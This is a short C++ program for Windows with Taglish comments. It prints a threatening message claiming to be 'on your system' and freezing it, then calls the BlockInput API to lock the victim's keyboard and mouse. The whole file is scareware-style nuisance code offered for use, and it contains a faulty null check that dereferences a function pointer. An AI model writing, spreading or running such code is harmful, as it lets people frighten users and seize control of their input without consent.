//Chaelgutierrez
#include <stdio.h> // pwede iostream but mas ok if original header ng c ang gamit
#include <windows.h>//Windows 
#include <conio.h>
#include <string.h>
#include <iostream>
using namespace std;
 	
int main(){
	system("color a");
	SetConsoleTitle("Chael_gutierrez");
	cout<<"Hello this is Chael Im on your system...\nIm freezing now your system, Don't do anything or else I'll break your system...";
		                                                                               
	HINSTANCE hDLL= LoadLibraryW(L"user32.dll");        //user32.dll checker para sa xp and 7 above
	if(hDLL== NULL){
	 		   fprintf(stderr,"Failed to load user32.DLL file,error code %d\n",GetLastError());
	 		   return 1;
			  }
			  
 			  typedef BOOL(WINAPI *BLOCKINPUT)(BOOL);
 			  BLOCKINPUT pBlockInput;
 			  pBlockInput=(BLOCKINPUT) GetProcAddress(hDLL,"BlockInput");
 			  if(*pBlockInput == NULL){
 					    //fprintf(stderr,"Failed to import BlockInput, error code %d\n",GetLastError());
 					    FreeLibrary(hDLL);
 					    return 1;
					   }
	
	else{
		 
		 BOOL res= pBlockInput(TRUE);
		 if(res){
		 		   //fprintf(stderr,"Block Input Failed, error code %d\n",GetLastError());
				  }
		 		  Sleep(1000);
				  }

	FreeLibrary(hDLL);         
	_getch();
	                                                                                     
}
